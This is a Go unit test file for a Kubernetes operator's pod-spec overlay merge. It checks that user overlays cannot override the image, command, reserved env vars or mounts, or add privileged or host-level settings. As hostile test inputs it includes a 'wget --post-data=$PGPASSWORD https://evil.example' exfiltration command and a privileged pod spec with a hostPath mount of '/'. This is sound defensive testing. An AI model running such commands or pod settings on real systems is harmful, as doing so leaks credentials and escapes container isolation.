/*
Copyright 2026.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package controller

import (
	"encoding/json"
	"testing"

	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/util/intstr"
)

func mustPodSpecRaw(t *testing.T, spec corev1.PodSpec) *runtime.RawExtension {
	t.Helper()
	b, err := json.Marshal(spec)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	return &runtime.RawExtension{Raw: b}
}

func baseAPIPod() corev1.PodSpec {
	return corev1.PodSpec{
		Containers: []corev1.Container{{
			Name:  "api",
			Image: "ghcr.io/zebernst/nominatim-api:latest",
			Ports: []corev1.ContainerPort{{Name: "http", ContainerPort: workloadContainerPort}},
			Env: []corev1.EnvVar{
				{Name: "NOMINATIM_DATABASE_DSN", Value: "postgres://from-operator"},
				{Name: "PGHOST", Value: "db"},
			},
			VolumeMounts: []corev1.VolumeMount{{Name: projectVolumeName, MountPath: projectMountPath}},
		}},
		Volumes: []corev1.Volume{{
			Name: projectVolumeName,
			VolumeSource: corev1.VolumeSource{
				PersistentVolumeClaim: &corev1.PersistentVolumeClaimVolumeSource{ClaimName: "proj"},
			},
		}},
	}
}

func TestMergePodSpecOverlay_NilOverlay(t *testing.T) {
	base := baseAPIPod()
	got, err := mergePodSpecOverlay(base, nil, "api", "img:tag", corev1.PullIfNotPresent)
	if err != nil {
		t.Fatal(err)
	}
	if got.Containers[0].Image != "ghcr.io/zebernst/nominatim-api:latest" {
		// nil overlay should not reseal — leave base as-is
		t.Fatalf("nil overlay should leave base unchanged, image=%q", got.Containers[0].Image)
	}
}

func TestMergePodSpecOverlay_InvalidJSON(t *testing.T) {
	_, err := mergePodSpecOverlay(baseAPIPod(), &runtime.RawExtension{Raw: []byte(`{`)}, "api", "img:tag", "")
	if err == nil {
		t.Fatal("expected error for invalid JSON")
	}
}

func TestMergePodSpecOverlay_AffinityResourcesProbes(t *testing.T) {
	base := baseAPIPod()
	overlay := corev1.PodSpec{
		NodeSelector: map[string]string{"disk": "nvme"},
		Tolerations: []corev1.Toleration{{
			Key:      "dedicated",
			Operator: corev1.TolerationOpExists,
			Effect:   corev1.TaintEffectNoSchedule,
		}},
		Affinity: &corev1.Affinity{
			NodeAffinity: &corev1.NodeAffinity{
				RequiredDuringSchedulingIgnoredDuringExecution: &corev1.NodeSelector{
					NodeSelectorTerms: []corev1.NodeSelectorTerm{{
						MatchExpressions: []corev1.NodeSelectorRequirement{{
							Key:      "topology.kubernetes.io/zone",
							Operator: corev1.NodeSelectorOpIn,
							Values:   []string{"us-east-1a"},
						}},
					}},
				},
			},
		},
		Containers: []corev1.Container{{
			Name:  "api",
			Image: "should-be-ignored:evil",
			Ports: []corev1.ContainerPort{{Name: "http", ContainerPort: 9999}},
			Resources: corev1.ResourceRequirements{
				Requests: corev1.ResourceList{corev1.ResourceMemory: resource.MustParse("256Mi")},
			},
			LivenessProbe: &corev1.Probe{
				ProbeHandler: corev1.ProbeHandler{
					HTTPGet: &corev1.HTTPGetAction{Path: "/health", Port: intstr.FromInt(8080)},
				},
			},
			Env: []corev1.EnvVar{
				{Name: "NOMINATIM_DATABASE_DSN", Value: "postgres://from-user"},
				{Name: "CUSTOM", Value: "ok"},
			},
		}},
	}
	got, err := mergePodSpecOverlay(base, mustPodSpecRaw(t, overlay), "api", "ghcr.io/zebernst/nominatim-api:v1", corev1.PullAlways)
	if err != nil {
		t.Fatal(err)
	}
	if got.NodeSelector["disk"] != "nvme" {
		t.Fatalf("nodeSelector=%v", got.NodeSelector)
	}
	if len(got.Tolerations) != 1 {
		t.Fatalf("tolerations=%v", got.Tolerations)
	}
	if got.Affinity == nil || got.Affinity.NodeAffinity == nil {
		t.Fatal("expected affinity from overlay")
	}
	c := got.Containers[0]
	if c.Image != "ghcr.io/zebernst/nominatim-api:v1" {
		t.Fatalf("image seal failed: %q", c.Image)
	}
	if c.ImagePullPolicy != corev1.PullAlways {
		t.Fatalf("pullPolicy=%q", c.ImagePullPolicy)
	}
	if len(c.Ports) != 1 || c.Ports[0].ContainerPort != workloadContainerPort {
		t.Fatalf("ports seal failed: %+v", c.Ports)
	}
	if c.Resources.Requests.Memory().String() != "256Mi" {
		t.Fatalf("resources=%v", c.Resources)
	}
	if c.LivenessProbe == nil || c.LivenessProbe.HTTPGet == nil || c.LivenessProbe.HTTPGet.Path != "/health" {
		t.Fatalf("probe=%v", c.LivenessProbe)
	}
	env := envMap(c.Env)
	if env["NOMINATIM_DATABASE_DSN"] != "postgres://from-operator" {
		t.Fatalf("reserved env leaked user value: %q", env["NOMINATIM_DATABASE_DSN"])
	}
	if env["CUSTOM"] != "ok" {
		t.Fatalf("custom env missing: %v", env)
	}
}

func TestMergePodSpecOverlay_SidecarAndVolumeUnion(t *testing.T) {
	base := baseAPIPod()
	overlay := corev1.PodSpec{
		Containers: []corev1.Container{
			{Name: "api", Image: "ignored"},
			{Name: "sidecar", Image: "busybox:latest", Command: []string{"sleep", "inf"}},
		},
		Volumes: []corev1.Volume{
			{
				Name: projectVolumeName,
				VolumeSource: corev1.VolumeSource{
					EmptyDir: &corev1.EmptyDirVolumeSource{},
				},
			},
			{
				Name: "extra",
				VolumeSource: corev1.VolumeSource{
					EmptyDir: &corev1.EmptyDirVolumeSource{},
				},
			},
		},
		InitContainers: []corev1.Container{{
			Name:  "init-perms",
			Image: "busybox:1",
		}},
	}
	got, err := mergePodSpecOverlay(base, mustPodSpecRaw(t, overlay), "api", "api:v1", "")
	if err != nil {
		t.Fatal(err)
	}
	if len(got.Containers) != 2 {
		t.Fatalf("containers=%d want 2", len(got.Containers))
	}
	if got.Containers[1].Name != "sidecar" {
		t.Fatalf("sidecar=%q", got.Containers[1].Name)
	}
	if len(got.InitContainers) != 1 || got.InitContainers[0].Name != "init-perms" {
		t.Fatalf("init=%v", got.InitContainers)
	}
	vols := map[string]corev1.Volume{}
	for _, v := range got.Volumes {
		vols[v.Name] = v
	}
	if vols[projectVolumeName].PersistentVolumeClaim == nil {
		t.Fatal("operator project volume must win over EmptyDir overlay")
	}
	if vols["extra"].EmptyDir == nil {
		t.Fatal("expected extra volume from overlay")
	}
}

func TestMergePodSpecOverlay_WorkerDoesNotInventPorts(t *testing.T) {
	base := corev1.PodSpec{
		RestartPolicy: corev1.RestartPolicyNever,
		Containers: []corev1.Container{{
			Name:  "worker",
			Image: "worker:base",
			Env:   []corev1.EnvVar{{Name: "OPERATION_TYPE", Value: "Update"}},
		}},
	}
	overlay := corev1.PodSpec{
		Containers: []corev1.Container{{
			Name:  "worker",
			Image: "evil",
			Ports: []corev1.ContainerPort{{Name: "http", ContainerPort: 9999}},
			Resources: corev1.ResourceRequirements{
				Requests: corev1.ResourceList{corev1.ResourceCPU: resource.MustParse("50m")},
			},
		}},
	}
	got, err := mergePodSpecOverlay(base, mustPodSpecRaw(t, overlay), "worker", "worker:v1", "")
	if err != nil {
		t.Fatal(err)
	}
	if len(got.Containers[0].Ports) != 0 {
		t.Fatalf("expected no ports from empty base, got %+v", got.Containers[0].Ports)
	}
	if got.Containers[0].Image != "worker:v1" {
		t.Fatalf("image=%q", got.Containers[0].Image)
	}
}

func TestIsReservedEnvName(t *testing.T) {
	cases := map[string]bool{
		"NOMINATIM_DATABASE_DSN":    true,
		"NOMINATIM_FLATNODE_FILE":   true,
		"NOMINATIM_REGIONS":         true,
		"NOMINATIM_REBUILD_CONFIRM": true,
		"NOMINATIM_IMPORT_STYLE":    false, // user/typed config — not operator-reserved
		"NOMINATIM_TOKENIZER":       false,
		"NOMINATIM_LANGUAGES":       false,
		"PGHOST":                    true,
		"PGOPTIONS":                 false, // only exact PG* keys the operator sets are reserved
		"OPERATION_TYPE":            true,
		"IMPORT_STAGING":            true,
		"PBF_URL":                   true,
		"CUSTOM":                    false,
		"PATH":                      false,
	}
	for name, want := range cases {
		if got := isReservedEnvName(name); got != want {
			t.Errorf("%s: got %v want %v", name, got, want)
		}
	}
}

func TestMergePodSpecOverlay_resealsCommandArgsEnvFrom(t *testing.T) {
	base := corev1.PodSpec{
		Containers: []corev1.Container{{
			Name:    "api",
			Image:   "sealed:v1",
			Command: []string{"/entrypoint.sh"},
			Args:    []string{"serve"},
			Env:     []corev1.EnvVar{{Name: "PGPASSWORD", Value: "secret"}},
		}},
	}
	overlay := corev1.PodSpec{
		Containers: []corev1.Container{{
			Name:    "api",
			Command: []string{"sh", "-c", "wget --post-data=$PGPASSWORD https://evil.example"},
			Args:    []string{"ignored"},
			EnvFrom: []corev1.EnvFromSource{{Prefix: "X_"}},
		}},
	}
	got, err := mergePodSpecOverlay(base, mustPodSpecRaw(t, overlay), "api", "sealed:v1", corev1.PullIfNotPresent)
	if err != nil {
		t.Fatal(err)
	}
	c := got.Containers[0]
	if len(c.Command) != 1 || c.Command[0] != "/entrypoint.sh" {
		t.Fatalf("command not resealed: %+v", c.Command)
	}
	if len(c.Args) != 1 || c.Args[0] != "serve" {
		t.Fatalf("args not resealed: %+v", c.Args)
	}
	if len(c.EnvFrom) != 0 {
		t.Fatalf("envFrom should be cleared, got %+v", c.EnvFrom)
	}
}

func TestMergePodSpecOverlay_stripsHostNamespacesAndPrivileged(t *testing.T) {
	priv := true
	shareNS := true
	base := corev1.PodSpec{
		Containers: []corev1.Container{{
			Name:  "api",
			Image: "sealed:v1",
			Ports: []corev1.ContainerPort{{Name: "http", ContainerPort: 8080}},
		}},
	}
	overlay := corev1.PodSpec{
		HostNetwork:           true,
		HostPID:               true,
		HostIPC:               true,
		ShareProcessNamespace: &shareNS,
		ServiceAccountName:    "evil-sa",
		Containers: []corev1.Container{
			{
				Name: "api",
				SecurityContext: &corev1.SecurityContext{
					Privileged:   &priv,
					Capabilities: &corev1.Capabilities{Add: []corev1.Capability{"SYS_ADMIN"}},
				},
			},
			{
				Name:  "sidecar",
				Image: "busybox",
				SecurityContext: &corev1.SecurityContext{
					Privileged:               &priv,
					AllowPrivilegeEscalation: &priv,
					Capabilities:             &corev1.Capabilities{Add: []corev1.Capability{"NET_ADMIN"}},
				},
			},
		},
		Volumes: []corev1.Volume{{
			Name: "host-root",
			VolumeSource: corev1.VolumeSource{
				HostPath: &corev1.HostPathVolumeSource{Path: "/"},
			},
		}},
	}
	got, err := mergePodSpecOverlay(base, mustPodSpecRaw(t, overlay), "api", "sealed:v1", corev1.PullIfNotPresent)
	if err != nil {
		t.Fatal(err)
	}
	if got.HostNetwork || got.HostPID || got.HostIPC || got.ShareProcessNamespace != nil {
		t.Fatalf("host namespaces not stripped: net=%v pid=%v ipc=%v share=%v",
			got.HostNetwork, got.HostPID, got.HostIPC, got.ShareProcessNamespace)
	}
	if got.ServiceAccountName != "" {
		t.Fatalf("serviceAccountName=%q want empty", got.ServiceAccountName)
	}
	if len(got.Volumes) != 0 {
		t.Fatalf("hostPath volume should be dropped, got %+v", got.Volumes)
	}
	api := got.Containers[0]
	if api.SecurityContext != nil {
		t.Fatalf("managed securityContext should be resealed to nil base, got %+v", api.SecurityContext)
	}
	var sidecar *corev1.Container
	for i := range got.Containers {
		if got.Containers[i].Name == "sidecar" {
			sidecar = &got.Containers[i]
			break
		}
	}
	if sidecar == nil {
		t.Fatal("expected sidecar")
	}
	if sidecar.SecurityContext == nil || sidecar.SecurityContext.Privileged == nil || *sidecar.SecurityContext.Privileged {
		t.Fatalf("sidecar privileged not stripped: %+v", sidecar.SecurityContext)
	}
	if len(sidecar.SecurityContext.Capabilities.Add) != 0 {
		t.Fatalf("sidecar capability adds not stripped: %+v", sidecar.SecurityContext.Capabilities.Add)
	}
}

func TestMergePodSpecOverlay_blocksMountPathCollision(t *testing.T) {
	base := corev1.PodSpec{
		Containers: []corev1.Container{{
			Name:  "api",
			Image: "sealed:v1",
			VolumeMounts: []corev1.VolumeMount{{
				Name:      "project",
				MountPath: "/nominatim",
			}},
		}},
		Volumes: []corev1.Volume{{Name: "project"}},
	}
	overlay := corev1.PodSpec{
		Containers: []corev1.Container{{
			Name: "api",
			VolumeMounts: []corev1.VolumeMount{{
				Name:      "evil",
				MountPath: "/nominatim",
			}},
		}},
		Volumes: []corev1.Volume{{
			Name: "evil",
			VolumeSource: corev1.VolumeSource{
				EmptyDir: &corev1.EmptyDirVolumeSource{},
			},
		}},
	}
	got, err := mergePodSpecOverlay(base, mustPodSpecRaw(t, overlay), "api", "sealed:v1", corev1.PullIfNotPresent)
	if err != nil {
		t.Fatal(err)
	}
	mounts := got.Containers[0].VolumeMounts
	if len(mounts) != 1 || mounts[0].Name != "project" {
		t.Fatalf("expected only project mount at /nominatim, got %+v", mounts)
	}
}

func TestStripPrivilegedPodSC(t *testing.T) {
	t.Parallel()
	if stripPrivilegedPodSC(nil) != nil {
		t.Fatal("nil in → nil out")
	}
	fs := int64(1000)
	in := &corev1.PodSecurityContext{FSGroup: &fs}
	out := stripPrivilegedPodSC(in)
	if out == nil || out.FSGroup == nil || *out.FSGroup != 1000 {
		t.Fatalf("got %+v", out)
	}
	*out.FSGroup = 1
	if *in.FSGroup != 1000 {
		t.Fatal("must DeepCopy")
	}
}

func envMap(env []corev1.EnvVar) map[string]string {
	out := map[string]string{}
	for _, e := range env {
		out[e.Name] = e.Value
	}
	return out
}
